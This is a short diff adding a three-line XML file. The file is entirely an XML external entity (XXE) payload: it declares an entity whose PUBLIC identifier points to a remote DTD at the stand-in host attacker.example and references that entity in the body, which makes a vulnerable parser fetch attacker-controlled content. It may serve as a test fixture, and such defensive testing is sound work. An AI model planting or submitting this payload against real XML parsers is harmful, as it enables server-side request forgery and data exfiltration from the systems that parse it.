@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE x [<!ENTITY xxe PUBLIC "-//X//X" "http://attacker.example/x.dtd">]>
+<p>&xxe;</p>
